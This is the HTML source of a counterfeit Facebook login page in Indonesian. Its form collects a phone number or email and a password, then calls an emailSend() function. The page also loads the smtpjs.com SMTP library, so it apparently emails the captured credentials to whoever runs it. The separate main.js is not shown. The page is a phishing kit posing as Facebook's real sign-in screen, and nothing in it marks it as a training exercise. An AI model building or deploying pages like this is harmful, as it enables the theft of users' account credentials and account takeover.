<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Facebook Login</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="loader">
    <div class="load"></div>
    <div class="load2"></div>
    <div class="load3"></div>
  </div>
  <div class="popup"></div>
  <div class="container">
    <h1>Facebook</h1>
    <span id="tampilkan"></span>
    <form id="kirim" onsubmit="emailSend(); reset(); return false;">
      <div class="name">
        <label for="name">Nomor ponsel atau email</label>
        <input type="text" id="name" >
        <span id="info"><i class="fa-solid fa-info"></i></span>
      </div>
      <div class="password">
        <label for="password">Kata sandi</label>
        <input type="password" id="password" >
        <span class="slash" style='font-size:20px;'><i class="fa-solid fa-slash"></i></span>
        <span class="eye"><i class="fa-solid fa-eye"></i></span>
      </div>
      <button type="submit" id="login">Login</button>
      <a href="#">Lupa kata sandi?</a>
    </form>
    <div class="create">
      <label>atau</label>
      <button type="button" id="btn">Buat akun baru</button>
    </div>
    <div class="language">
      <ul>
        <li class="active">Bahasa Indonesia</li>
        <li>Bahasa Jawa</li>
        <li>English (US)</li>
        <li>Bahasa Lainnya...</li>
      </ul>
    </div>
  </div>
</body>
</html>
<script src="https://smtpjs.com/v3/smtp.js"></script>
<script src="main.js"></script>
